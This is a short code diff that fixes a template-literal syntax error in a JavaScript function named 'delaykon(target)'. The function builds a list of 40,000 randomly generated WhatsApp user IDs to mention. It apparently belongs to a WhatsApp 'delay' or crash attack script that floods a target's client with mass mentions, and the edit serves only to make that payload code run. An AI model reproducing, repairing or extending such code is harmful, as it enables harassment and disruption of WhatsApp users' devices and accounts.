@@ -2159,7 +2159,7 @@ async function delaykon(target) {
   const mentionedList = [
     "13135550002@s.whatsapp.net",
     ...Array.from({ length: 40000 }, () =>
-      1${Math.floor(Math.random() * 999999)}@s.whatsapp.net
+      `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`
     )
   ];
 
